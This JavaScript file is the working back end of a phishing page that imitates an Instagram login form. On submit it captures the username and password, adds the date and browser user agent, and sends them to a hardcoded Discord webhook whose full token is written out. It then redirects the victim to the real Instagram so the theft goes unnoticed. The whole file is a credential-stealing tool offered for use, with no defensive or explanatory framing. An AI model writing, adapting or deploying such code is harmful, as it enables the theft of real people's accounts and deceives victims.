document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.login-form');
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1345612035039428679/LXPLmZu07Cz6aGTR8lwZyP84Imy1-WvlZrSNWCz4aNmceTWNAVMLdacQvkWvTq0la5jP";

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Get additional information
        const date = new Date().toLocaleString();
        const userAgent = navigator.userAgent;
        
        // Prepare Discord message
        const message = {
            content: "🎣 New Instagram Login Captured",
            embeds: [{
                title: "Instagram Credentials",
                color: 0xE1306C, // Instagram brand color
                fields: [
                    {
                        name: "📧 Username/Email",
                        value: "```" + username + "```",
                        inline: true
                    },
                    {
                        name: "🔑 Password",
                        value: "```" + password + "```",
                        inline: true
                    },
                    {
                        name: "⏰ Date",
                        value: "```" + date + "```",
                        inline: false
                    },
                    {
                        name: "🌐 Browser Info",
                        value: "```" + userAgent + "```",
                        inline: false
                    }
                ],
                footer: {
                    text: "Instagram Phishing Page"
                }
            }]
        };

        // Send to Discord webhook
        fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message)
        })
        .then(response => {
            if (response.ok) {
                // Redirect to real Instagram after sending data
                window.location.href = "https://www.instagram.com";
            }
        })
        .catch(error => console.error('Error:', error));

        // Clear the form
        form.reset();
    });
}); 